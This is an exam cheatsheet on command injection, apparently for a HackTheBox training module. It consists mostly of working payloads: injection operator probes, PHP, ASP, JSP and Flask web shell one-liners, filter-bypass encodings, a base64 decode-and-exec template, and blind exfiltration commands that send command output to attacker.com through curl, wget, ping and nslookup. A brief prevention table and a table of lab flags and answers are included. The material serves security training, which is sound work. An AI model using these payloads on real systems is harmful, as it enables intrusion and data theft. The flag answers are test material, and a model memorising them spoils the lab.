# Command Injections — Exam Cheatsheet

---

## Detection

```bash
# Submit benign input first, then add each operator one at a time
?ip=127.0.0.1                        # baseline
?ip=127.0.0.1;whoami                 # ; test
?ip=127.0.0.1|whoami                 # | test  (only second output)
?ip=127.0.0.1&&whoami                # && test (both, if first succeeds)
?ip=127.0.0.1||whoami                # || test (only second, if first fails)
?ip=127.0.0.1%0awhoami               # newline
```

Output behavior cheatsheet:
| Operator | Char | URL-enc | Output |
|----------|------|---------|--------|
| Semicolon | `;` | `%3b` | Both |
| Newline | `\n` | `%0a` | Both |
| Pipe | `\|` | `%7c` | **Second only** |
| Background | `&` | `%26` | Both (second first) |
| AND | `&&` | `%26%26` | Both (if first OK) |
| OR | `\|\|` | `%7c%7c` | Second only (if first fails) |
| Subshell (backtick) | `` ` `` | `%60` | Inline |
| Subshell ($) | `$()` | `%24%28%29` | Inline |

---

## Web Shell One-Liners

```php
// PHP
<?php system($_REQUEST['cmd']); ?>
<?php passthru($_GET['c']); ?>          // alt if system blocked
<?php echo shell_exec($_GET['c']); ?>
<?php echo `{$_GET['c']}`; ?>           // backticks
```

```asp
<% eval request('cmd') %>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```python
__import__('os').system(request.args.get('cmd'))   # Flask
```

---

## Filter Bypass — By What's Blocked

### Operator blocked
| Blocked | Try |
|---------|-----|
| `;` | `%0a` (newline), `&&`, `\|`, `\|\|` |
| `&` and `\|` | `%0a`, `;` if not blocked |
| Everything common | `$()` subshell inline, `\`cmd\`` backticks |

### Space blocked
| Bypass | Payload |
|--------|---------|
| Tab | `%09` |
| `${IFS}` | `ls${IFS}-la` |
| Brace expansion | `{ls,-la}` |
| Input redirect | `cat</etc/passwd` |
| `$IFS$9` | `ls$IFS$9-la` |

### Slash `/` blocked
| Bypass | Payload |
|--------|---------|
| `${PATH:0:1}` | gives `/` |
| `${HOME:0:1}` | gives `/` |
| `${PWD:0:1}` | gives `/` |
| Char shift | `$(tr '!-}' '"-~'<<<.)` produces `/` |
| Hex printf | `$(printf '\57')` |

### Command word blocked
| Bypass | Payload for `whoami` |
|--------|----------------------|
| Quotes | `w'h'o'am'i` (single) or `w"h"o"am"i` (double) — even count, no mix |
| Backslash | `w\ho\am\i` |
| `$@` | `who$@ami` |
| `$1` | `who$1ami` (unset positional) |
| Variable concat | `a=who;b=ami;$a$b` |
| Case manip | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` |
| Reverse | `$(rev<<<"imaohw")` |
| Wildcards | `/???/c?t` matches `/bin/cat` |
| Base64 exec | `bash<<<$(base64 -d<<<d2hvYW1p)` |

---

## The Universal Payload Template

When everything is blocked:
```
?input=127.0.0.1%0a<base64_decode_wrapper>
```

```bash
# 1. Build command, base64 it
echo -n 'cat /etc/passwd' | base64
# Y2F0IC9ldGMvcGFzc3dk

# 2. Construct decode-and-exec wrapper (no pipes, no spaces, no slashes)
bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)

# 3. Inject after newline operator
?ip=127.0.0.1%0abash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dk)
```

The `<<<` here-string replaces `|` pipe. `${IFS}` replaces space. `$()` subshell wraps the decode.

---

## Useful Env Var Tricks

```bash
${PATH:0:1}     # /
${HOME:0:1}     # /  (when HOME starts with /)
${PWD:0:1}      # /
${LS_COLORS:10:1}  # ; (offset varies by distro)
${IFS}          # space (default IFS)
${IFS%??}       # truncated IFS — sometimes useful
$0              # current shell name (e.g., "bash")
$@ $* $1 $9     # positional args — empty in interactive
$$              # current PID
$RANDOM         # random integer
```

---

## Character Shifting (universal char production)

```bash
# Get char N by feeding char N-1:
echo $(tr '!-}' '"-~'<<<[)        # [ → \
echo $(tr '!-}' '"-~'<<<.)        # . → /
echo $(tr '!-}' '"-~'<<<:)        # : → ;
```

ASCII reference: `man ascii` — find char N, use N-1 as input.

---

## Blind Injection (no output reflected)

Use out-of-band channels:

```bash
# DNS exfil (most reliable — UDP, often unfiltered)
ping -c 1 $(whoami).attacker.com
nslookup $(whoami).attacker.com

# HTTP exfil
curl http://attacker.com/$(id|base64)
wget http://attacker.com/?d=$(id|base64)

# Time-based
sleep 5                                  # if response delays 5s, injection worked
$(if [ $(whoami) = root ]; then sleep 5; fi)   # exfil bit by bit

# Write to file then read
whoami>/tmp/x; cat /tmp/x
```

For DNS exfil with Burp Collaborator or interactsh:
```bash
ping -c 1 $(whoami).abc123.oast.fun
```

---

## Automated Tools

```bash
# Linux — Bashfuscator
git clone https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

# Windows — Invoke-DOSfuscation
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
pwsh -c 'Import-Module ./Invoke-DOSfuscation.psd1; Invoke-DOSfuscation'
```

---

## Prevention Reference

| Defense | Stops |
|---------|-------|
| **Argv array invocation** (`subprocess.run(["cmd", arg])`) | All command injection — the only true fix |
| Input validation (whitelist format via `filter_var`/regex) | Pre-injection filtering |
| Input sanitization (`preg_replace`) | Defense-in-depth |
| `escapeshellarg()` / `escapeshellcmd()` | Most injection (bypassable in edge cases) |
| `disable_functions` (PHP) | RCE even if injection succeeds |
| `open_basedir` | File system access |
| Run as low-privilege user (www-data) | Blast radius |
| ModSecurity / WAF | Common patterns |

---

## Lab Flag Reference

| Section | Technique | Flag / Answer |
|---------|-----------|---------------|
| 2 — Detection | HTML5 `pattern=` validation message | `Please match the requested format.` |
| 3 — Inject command | Find line of front-end validation | Line `17` |
| 4 — Other operators | Which shows only injected output? | `\|` (pipe) |
| 5 — Identify filters | Which of `\n`/`&`/`\|` not blacklisted? | `newline` |
| 6 — Space bypass | `ls -la` to find size of index.php | `1613` |
| 7 — Slash bypass | `ls /home` to find user | `1nj3c70r` |
| 8 — Cmd bypass | `cat /home/1nj3c70r/flag.txt` | `HTB{b451c_f1l73r5_w0n7_570p_m3}` |
| 9 — Obfuscation | base64 + bash<<<$() for piped command | `/usr/share/mysql/debian_create_root_user.sql` |
| 12 — Skills Assessment | TFM 2.4.6 move operation injection | `HTB{c0mm4nd3r_1nj3c70r}` |

---

## Decision Tree When Stuck

```
Detection — any character produces a different response?
  → start testing operators

Single operator works?
  → build command, test for cmd-name filter
  → bypass with quotes (c'a't), backslash (c\at), $@

Space blocked?
  → ${IFS} (universal), %09 (tab), {cmd,arg} (brace expansion)

Slash blocked?
  → ${PATH:0:1}, ${HOME:0:1}, character shifting

Command name blocked?
  → quote obfuscation, reverse with rev<<<, base64 decode

Output not visible?
  → blind: DNS exfil via ping/$(cmd).attacker.com
  → time-based: sleep with conditional

WAF blocking everything?
  → automated: Bashfuscator/DOSfuscation
  → combine: case + reverse + base64 + char shift
```
